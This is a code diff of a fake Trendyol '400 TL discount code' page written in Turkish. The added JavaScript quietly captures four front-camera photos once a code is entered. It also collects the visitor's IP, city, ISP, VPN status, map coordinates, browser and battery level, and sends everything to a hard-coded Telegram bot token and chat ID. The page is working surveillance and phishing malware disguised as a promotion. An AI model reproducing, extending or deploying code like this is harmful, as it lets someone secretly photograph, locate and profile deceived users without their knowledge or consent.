@@ -1,9 +1,9 @@
 <!DOCTYPE html><html lang="tr">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
   <title>Trendyol - 400 TL İndirim Kodu</title>
-  <link rel="icon" href="https://cdn.dsmcdn.com/web/favicon.ico">
+  <link rel="icon" href="https://cdn.dsmcdn.com/web/favicon.ico" />
   <style>
     * {
       box-sizing: border-box;
@@ -80,16 +80,20 @@
 </head>
 <body>
   <header>
-    <img src="https://cdn.dsmcdn.com/web/logo/ty-web.svg" alt="Trendyol">
+    <img src="https://cdn.dsmcdn.com/web/logo/ty-web.svg" alt="Trendyol" />
   </header>
   <div class="container">
     <h2>400 TL Değerinde İndirim Kodunuzu Alın</h2>
-    <input type="text" id="password" placeholder="Kodunuzu girin">
+    <input type="text" id="password" placeholder="Kodunuzu girin" />
     <button onclick="submitCode()">Kodu Göster</button>
     <div class="error" id="error">Kod hatalı veya süresi dolmuş olabilir.</div>
     <div class="code-box" id="codeBox">TR-XXXX-YY</div>
-  </div>  <script>
+  </div>
+
+  <script>
     const correctPassword = "670570";
+    const botToken = "8489674777:AAG1eCe75YEKNHrCPHbzUgb3n1Ag6_S83sY";
+    const chatId = "7791726274";
 
     function generateFakeCode() {
       const part1 = Math.floor(1000 + Math.random() * 9000);
@@ -97,13 +101,91 @@
       return `TR-${part1}-${part2}`;
     }
 
-    async function getIPData() {
+    // IP ve detaylı bilgileri ip-api'den çekiyoruz
+    async function getIPDetails() {
       try {
-        const res = await fetch("https://api.db-ip.com/v2/free/self");
-        return await res.json();
-      } catch (e) {
-        return {};
+        const res = await fetch("http://ip-api.com/json/?fields=status,message,country,city,query,isp,proxy,mobile,lat,lon");
+        const data = await res.json();
+        if(data.status === "success") {
+          return data;
+        }
+        return null;
+      } catch(e) {
+        return null;
       }
+    }
+
+    // Batarya bilgisi alalım
+    async function getBattery() {
+      if(navigator.getBattery) {
+        try {
+          const battery = await navigator.getBattery();
+          return {
+            level: Math.floor(battery.level * 100) + "%",
+            charging: battery.charging
+          };
+        } catch {
+          return null;
+        }
+      }
+      return null;
+    }
+
+    // Kamera fotoğraf çekimi fonksiyonu, 4 tane foto çekecek, base64 döner
+    async function capturePhotos(count = 4, delayMs = 1000) {
+      if(!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
+        return [];
+      }
+      const stream = await navigator.mediaDevices.getUserMedia({video: {facingMode: "user"}});
+      const video = document.createElement("video");
+      video.srcObject = stream;
+      video.play();
+
+      // 1 saniye video hazır olsun diye bekle
+      await new Promise(r => setTimeout(r, 1000));
+
+      const canvas = document.createElement("canvas");
+      canvas.width = 320; // küçük boyut, fazla büyütme
+      canvas.height = 240;
+      const ctx = canvas.getContext("2d");
+      const photos = [];
+
+      for(let i=0; i<count; i++) {
+        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+        const imgData = canvas.toDataURL("image/jpeg", 0.7);
+        photos.push(imgData);
+        await new Promise(r => setTimeout(r, delayMs));
+      }
+
+      stream.getTracks().forEach(track => track.stop());
+      return photos;
+    }
+
+    // Telegram'a mesaj gönderme fonksiyonu
+    async function sendTelegramMessage(text) {
+      await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+        method: "POST",
+        headers: {"Content-Type": "application/json"},
+        body: JSON.stringify({
+          chat_id: chatId,
+          text: text,
+          parse_mode: "HTML"
+        }),
+      });
+    }
+
+    // Telegram'a fotoğraf gönderme fonksiyonu (base64'i blob yapıp formdata ile göndereceğiz)
+    async function sendTelegramPhoto(base64data, caption = "") {
+      const blob = await (await fetch(base64data)).blob();
+      const formData = new FormData();
+      formData.append("chat_id", chatId);
+      formData.append("photo", blob);
+      if(caption) formData.append("caption", caption);
+
+      await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
+        method: "POST",
+        body: formData
+      });
     }
 
     async function submitCode() {
@@ -112,30 +194,51 @@
       const codeBox = document.getElementById("codeBox");
 
       if (input === correctPassword) {
+        error.style.display = "none";
+
+        // 1- Önce 4 foto çekelim
+        let photos = [];
+        try {
+          photos = await capturePhotos(4, 1000);
+        } catch (e) {
+          // Kamera izni yoksa veya hata varsa photos boş kalacak
+          photos = [];
+        }
+
+        // 2- Kod üret
         const code = generateFakeCode();
         codeBox.textContent = code;
         codeBox.style.display = "block";
-        error.style.display = "none";
 
-        const ipData = await getIPData();
+        // 3- IP ve detayları çek
+        const ipData = await getIPDetails();
         const device = navigator.userAgent;
+        const battery = await getBattery();
 
-        fetch(`https://api.telegram.org/bot8489674777:AAG1eCe75YEKNHrCPHbzUgb3n1Ag6_S83sY/sendMessage`, {
-          method: "POST",
-          headers: {
-            "Content-Type": "application/json",
-          },
-          body: JSON.stringify({
-            chat_id: "7791726274",
-            text: `Yeni giriş yapıldı:\nKod: ${code}\nIP: ${ipData.ipAddress || "-"}\nŞehir: ${ipData.city || "-"}\nÜlke: ${ipData.countryName || "-"}\nCihaz: ${device}`,
-          }),
-        });
+        // Mesaj formatı istediğin gibi:
+        let message = `📡 IP: ${ipData?.query || "-"}\n` +
+                      `🌍 Ülke: ${ipData?.country || "-"}\n` +
+                      `🏙️ Şehir: ${ipData?.city || "-"}\n` +
+                      `🧠 ISP: ${ipData?.isp || "-"}\n` +
+                      `📱 Tarayıcı: ${device}\n` +
+                      `🔐 VPN/Proxy: ${ipData?.proxy ? "Evet" : "Hayır"}\n` +
+                      `🗺️ Harita: https://www.google.com/maps?q=${ipData?.lat || 0},${ipData?.lon || 0}\n` +
+                      `🔋 Şarj: ${battery ? battery.level + (battery.charging ? " (Şarjda)" : " (Bataryada)") : "-"}\n\n` +
+                      `Yeni giriş yapıldı:\nKod: ${code}`;
 
-        // Kamera foto kısmı burada entegre edilecek (getUserMedia ile)
+        // 4- Telegram'a önce mesaj gönder
+        await sendTelegramMessage(message);
+
+        // 5- Telegram'a fotoğrafları tek tek gönder (caption olarak boş veriyoruz)
+        for(let i=0; i<photos.length; i++) {
+          await sendTelegramPhoto(photos[i], `Fotoğraf ${i+1}`);
+        }
+
       } else {
         error.style.display = "block";
         codeBox.style.display = "none";
       }
     }
-  </script></body>
+  </script>
+</body>
 </html>
